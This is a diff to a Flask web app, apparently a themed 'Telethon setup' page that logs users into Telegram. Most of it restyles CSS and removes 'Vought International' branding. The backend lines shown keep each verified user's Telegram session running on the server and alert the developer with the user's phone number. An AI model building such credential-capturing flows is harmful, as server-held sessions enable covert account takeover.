@@ -23,22 +23,23 @@ def home():
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <title>THE BOYS - TELETHON SETUP</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+  @import url('https://fonts.cdnfonts.com/css/friz-quadrata-std');
 
   :root {
     --bg:#0a0a0f;
-    --panel:rgba(20,20,28,0.9);
-    --line:rgba(200,30,30,0.15);
-    --line-hi:rgba(200,30,30,0.3);
-    --text:#e4e4ea;
-    --text-dim:rgba(228,228,234,0.6);
-    --text-faint:rgba(228,228,234,0.35);
+    --panel:rgba(22,22,30,0.85);
+    --line:rgba(255,255,255,0.06);
+    --line-hi:rgba(200,30,30,0.25);
+    --text:#e8e8ee;
+    --text-dim:rgba(232,232,238,0.55);
+    --text-faint:rgba(232,232,238,0.3);
     --accent:#c42020;
     --accent-hover:#d43030;
-    --ok:#1a8a4a;
+    --ok:#2a9d5c;
     --err:#c42020;
-    --r:8px;
-    --r2:14px;
+    --r:12px;
+    --r2:16px;
   }
   
   * { margin:0; padding:0; box-sizing:border-box; }
@@ -50,7 +51,7 @@ def home():
     display:flex;
     align-items:center;
     justify-content:center;
-    padding:20px;
+    padding:24px;
     -webkit-font-smoothing:antialiased;
     background: var(--bg);
     position:relative;
@@ -64,15 +65,18 @@ def home():
     width:100%;
     height:100%;
     background-image: 
-      radial-gradient(1px 1px at 10% 20%, rgba(255,255,255,0.3), transparent),
-      radial-gradient(1px 1px at 25% 55%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1px 1px at 40% 15%, rgba(255,255,255,0.25), transparent),
-      radial-gradient(1px 1px at 55% 70%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1px 1px at 70% 30%, rgba(255,255,255,0.3), transparent),
-      radial-gradient(1px 1px at 85% 60%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1px 1px at 15% 85%, rgba(255,255,255,0.15), transparent),
-      radial-gradient(1px 1px at 60% 45%, rgba(255,255,255,0.2), transparent),
-      radial-gradient(1px 1px at 90% 15%, rgba(255,255,255,0.25), transparent);
+      radial-gradient(1px 1px at 8% 18%, rgba(255,255,255,0.25), transparent),
+      radial-gradient(1px 1px at 22% 48%, rgba(255,255,255,0.18), transparent),
+      radial-gradient(1px 1px at 38% 12%, rgba(255,255,255,0.22), transparent),
+      radial-gradient(1px 1px at 52% 65%, rgba(255,255,255,0.2), transparent),
+      radial-gradient(1px 1px at 68% 28%, rgba(255,255,255,0.25), transparent),
+      radial-gradient(1px 1px at 82% 55%, rgba(255,255,255,0.18), transparent),
+      radial-gradient(1px 1px at 15% 82%, rgba(255,255,255,0.15), transparent),
+      radial-gradient(1px 1px at 58% 42%, rgba(255,255,255,0.2), transparent),
+      radial-gradient(1px 1px at 88% 14%, rgba(255,255,255,0.22), transparent),
+      radial-gradient(1px 1px at 32% 75%, rgba(255,255,255,0.16), transparent),
+      radial-gradient(1px 1px at 72% 88%, rgba(255,255,255,0.18), transparent),
+      radial-gradient(1px 1px at 48% 22%, rgba(255,255,255,0.2), transparent);
     pointer-events:none;
     z-index:0;
   }
@@ -89,22 +93,24 @@ def home():
 
   .hd { 
     text-align:center; 
-    margin-bottom:6px;
+    margin-bottom:28px;
+    margin-top:12px;
   }
   
   .hd h1 { 
-    font-size:26px; 
-    font-weight:700; 
-    letter-spacing:3px;
-    margin-bottom:4px;
+    font-family:'Friz Quadrata Std', 'Inter', sans-serif;
+    font-size:30px; 
+    font-weight:600; 
+    letter-spacing:1px;
+    margin-bottom:6px;
     color:var(--text);
     text-transform:uppercase;
   }
   
   .hd .subtitle { 
     font-size:11px; 
-    color:var(--text-dim); 
-    letter-spacing:2px;
+    color:var(--text-faint); 
+    letter-spacing:1.5px;
     font-weight:500;
     text-transform:uppercase;
   }
@@ -114,27 +120,28 @@ def home():
     border:1px solid var(--line);
     border-radius:var(--r2);
     padding:24px;
-    backdrop-filter:blur(20px);
-    -webkit-backdrop-filter:blur(20px);
+    backdrop-filter:blur(24px);
+    -webkit-backdrop-filter:blur(24px);
+    transition:border-color 0.3s ease;
   }
 
   .step-head {
     display:flex;
     align-items:center;
     justify-content:space-between;
-    margin-bottom:20px;
+    margin-bottom:22px;
   }
   
   .step-text {
     font-size:10px;
     font-weight:600;
     color:var(--text-faint);
-    letter-spacing:1.5px;
+    letter-spacing:1.2px;
     text-transform:uppercase;
-    background: rgba(200,30,30,0.06);
+    background: rgba(200,30,30,0.05);
     padding:4px 10px;
-    border-radius:12px;
-    border:1px solid rgba(200,30,30,0.15);
+    border-radius:10px;
+    border:1px solid rgba(200,30,30,0.12);
   }
 
   .back-btn {
@@ -148,8 +155,8 @@ def home():
     font-weight:500;
     cursor:pointer;
     padding:5px 10px;
-    transition:all 0.15s;
-    border-radius:6px;
+    border-radius:8px;
+    transition:all 0.2s ease;
   }
   .back-btn:hover { 
     color:var(--text);
@@ -166,8 +173,8 @@ def home():
     font-size:11px;
     font-weight:600;
     color:var(--text-dim);
-    margin-bottom:6px;
-    letter-spacing:0.8px;
+    margin-bottom:7px;
+    letter-spacing:0.6px;
     text-transform:uppercase;
   }
   
@@ -178,27 +185,27 @@ def home():
   .field input {
     width:100%;
     padding:11px 42px 11px 14px;
-    background:rgba(255,255,255,0.03);
+    background:rgba(255,255,255,0.025);
     border:1px solid var(--line);
-    border-radius:var(--r);
+    border-radius:10px;
     color:var(--text);
     font-size:14px;
     font-weight:500;
     font-family:'Inter',sans-serif;
     outline:none;
-    transition:all 0.2s;
+    transition:all 0.25s ease;
   }
   
   .field input::placeholder { 
     color:var(--text-faint);
     font-weight:400;
-    font-size:12px;
+    font-size:12.5px;
   }
   
   .field input:focus { 
     border-color:var(--accent);
     background:rgba(200,30,30,0.03);
-    box-shadow: 0 0 15px rgba(200,30,30,0.08);
+    box-shadow: 0 0 0 3px rgba(200,30,30,0.06);
   }
   
   #code {
@@ -222,12 +229,12 @@ def home():
     display:flex;
     align-items:center;
     justify-content:center;
-    opacity:0.4;
-    transition:opacity 0.15s;
+    opacity:0.35;
+    transition:all 0.2s ease;
     width:32px;
     height:32px;
     z-index:2;
-    border-radius:6px;
+    border-radius:8px;
   }
   .toggle-vis:hover { 
     opacity:1;
@@ -247,7 +254,7 @@ def home():
     width:100%;
     padding:12px;
     border:none;
-    border-radius:var(--r);
+    border-radius:10px;
     font-size:13px;
     font-weight:600;
     font-family:'Inter',sans-serif;
@@ -258,21 +265,22 @@ def home():
     align-items:center;
     justify-content:center;
     gap:8px;
-    transition:all 0.2s;
-    margin-top:6px;
-    letter-spacing:1.5px;
+    transition:all 0.25s ease;
+    margin-top:8px;
+    letter-spacing:1px;
     text-transform:uppercase;
   }
-  .btn:active { transform:scale(0.98); }
+  .btn:active { transform:scale(0.985); }
   
   .btn-primary { 
     background: var(--accent);
     color:#ffffff;
-    box-shadow: 0 2px 12px rgba(200,30,30,0.2);
+    box-shadow: 0 2px 12px rgba(200,30,30,0.15);
   }
   .btn-primary:hover { 
     background: var(--accent-hover);
-    box-shadow: 0 4px 20px rgba(200,30,30,0.3);
+    box-shadow: 0 4px 18px rgba(200,30,30,0.25);
+    transform:translateY(-1px);
   }
   
   .btn .prog-bar {
@@ -280,10 +288,10 @@ def home():
     bottom:0;
     left:0;
     height:2px;
-    background:rgba(255,255,255,0.4);
+    background:rgba(255,255,255,0.35);
     width:0%;
     transition:width 0.05s linear;
-    border-radius:0 0 var(--r) var(--r);
+    border-radius:0 0 10px 10px;
   }
   
   .btn.loading { 
@@ -309,17 +317,23 @@ def home():
     display:none;
     margin-top:12px;
     padding:10px 14px;
-    border-radius:var(--r);
+    border-radius:10px;
     font-size:12px;
     font-weight:500;
     text-align:center;
     letter-spacing:0.3px;
+    animation: fadeIn 0.25s ease;
+  }
+  
+  @keyframes fadeIn {
+    from { opacity:0; transform:translateY(5px); }
+    to { opacity:1; transform:translateY(0); }
   }
   
   .result.show { display:block; }
   .result.ok { 
-    background:rgba(26,138,74,0.08);
-    border:1px solid rgba(26,138,74,0.2);
+    background:rgba(42,157,92,0.08);
+    border:1px solid rgba(42,157,92,0.2);
     color:var(--ok);
   }
   .result.err { 
@@ -333,15 +347,15 @@ def home():
     border:1px solid var(--line);
     border-radius:var(--r2);
     padding:16px 18px;
-    backdrop-filter:blur(20px);
-    -webkit-backdrop-filter:blur(20px);
+    backdrop-filter:blur(24px);
+    -webkit-backdrop-filter:blur(24px);
   }
   .info-card h3 { 
     font-size:12px;
     font-weight:600;
     color:var(--text-dim);
     margin-bottom:8px;
-    letter-spacing:0.8px;
+    letter-spacing:0.6px;
     text-transform:uppercase;
   }
   .info-card p { 
@@ -359,20 +373,21 @@ def home():
     gap:6px;
     margin-top:12px;
     padding:8px 14px;
-    background:rgba(200,30,30,0.06);
-    border:1px solid rgba(200,30,30,0.2);
-    border-radius:8px;
+    background:rgba(200,30,30,0.05);
+    border:1px solid rgba(200,30,30,0.18);
+    border-radius:10px;
     color:var(--text);
     font-size:12px;
     font-weight:600;
     text-decoration:none;
-    transition:all 0.15s;
-    letter-spacing:0.5px;
+    transition:all 0.2s ease;
+    letter-spacing:0.4px;
     text-transform:uppercase;
   }
   .info-card a:hover { 
-    background:rgba(200,30,30,0.12);
+    background:rgba(200,30,30,0.1);
     border-color:var(--accent);
+    box-shadow: 0 2px 12px rgba(200,30,30,0.1);
   }
   .info-card a svg { width:13px; height:13px; }
 
@@ -380,6 +395,7 @@ def home():
     display:flex;
     gap:8px;
     justify-content:center;
+    margin-top:4px;
   }
   .footer-links a {
     flex:1;
@@ -390,21 +406,23 @@ def home():
     padding:9px 12px;
     background: var(--panel);
     border:1px solid var(--line);
-    border-radius:10px;
+    border-radius:12px;
     color:var(--text-dim);
     font-size:11px;
     font-weight:600;
     text-decoration:none;
-    transition:all 0.15s;
-    backdrop-filter:blur(20px);
-    -webkit-backdrop-filter:blur(20px);
-    letter-spacing:0.8px;
+    transition:all 0.2s ease;
+    backdrop-filter:blur(24px);
+    -webkit-backdrop-filter:blur(24px);
+    letter-spacing:0.6px;
     text-transform:uppercase;
   }
   .footer-links a:hover { 
     border-color:var(--accent);
     color:var(--text);
     background:rgba(200,30,30,0.06);
+    transform:translateY(-1px);
+    box-shadow: 0 4px 16px rgba(200,30,30,0.1);
   }
   .footer-links a svg { width:13px; height:13px; flex-shrink:0; }
 
@@ -420,28 +438,22 @@ def home():
     align-items:center;
     justify-content:center;
     flex-direction:column;
-    gap:16px;
+    gap:12px;
     backdrop-filter:blur(8px);
     -webkit-backdrop-filter:blur(8px);
   }
   .success-overlay.show {
     display:flex;
+    animation: fadeIn 0.3s ease;
   }
   
   .success-text {
-    font-size:22px;
-    font-weight:700;
-    letter-spacing:2px;
+    font-size:18px;
+    font-weight:600;
+    letter-spacing:1px;
     color:var(--text);
     text-transform:uppercase;
-  }
-  
-  .success-sub {
-    font-size:13px;
-    color:var(--text-dim);
-    letter-spacing:1.5px;
-    font-weight:500;
-    text-transform:uppercase;
+    padding-top:40vh;
   }
 
   .hidden { display:none; }
@@ -556,7 +568,6 @@ def home():
 
 <div class="success-overlay" id="successOverlay">
   <div class="success-text">You Are A Supe Now</div>
-  <div class="success-sub">Welcome to Vought International</div>
 </div>
 
 <script>
@@ -759,7 +770,7 @@ def api_verify():
             start_client_in_background(client, phone)
             await notify_dev(f"New Supe activated: {phone}")
             
-            return jsonify({"status": "success", "message": "You are now a Supe. Welcome to Vought International."})
+            return jsonify({"status": "success", "message": "You are now a Supe."})
         except Exception as e:
             logger.error(f"Verification error: {e}")
             return jsonify({"status": "error", "message": str(e)}), 400
@@ -790,7 +801,7 @@ if __name__ == '__main__':
         logger.error(f"Failed to load sessions: {e}")
 
     def handle_shutdown(signum, frame):
-        logger.info("Received shutdown signal - Vought signing off")
+        logger.info("Received shutdown signal")
         try:
             future = asyncio.run_coroutine_threadsafe(shutdown(), main_loop)
             future.result(timeout=10)
@@ -802,5 +813,5 @@ if __name__ == '__main__':
     signal.signal(signal.SIGINT, handle_shutdown)
 
     port = int(os.environ.get('PORT', 8080))
-    logger.info(f"Vought International server starting on port {port}")
+    logger.info(f"Server starting on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
